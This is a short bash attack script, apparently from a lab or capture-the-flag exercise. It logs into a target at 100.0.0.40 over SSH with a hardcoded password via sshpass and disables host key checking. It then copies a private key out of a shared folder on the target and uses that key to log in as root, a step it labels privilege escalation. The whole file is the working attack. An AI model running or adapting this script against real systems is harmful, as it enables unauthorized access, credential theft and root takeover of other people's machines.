#!/bin/bash

TARGET_IP="100.0.0.40"
TARGET_USER="user"
PRIVATE_KEY_PATH="/home/attacks/id_rsa"
PASSWORD="password123"

# find private kye
sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no ${TARGET_USER}@${TARGET_IP} "cat /home/${TARGET_USER}/shared/id_rsa" > "$PRIVATE_KEY_PATH"

#
chmod 600 "$PRIVATE_KEY_PATH"

# privilege escalation
ssh -i "$PRIVATE_KEY_PATH" -o StrictHostKeyChecking=no root@${TARGET_IP}
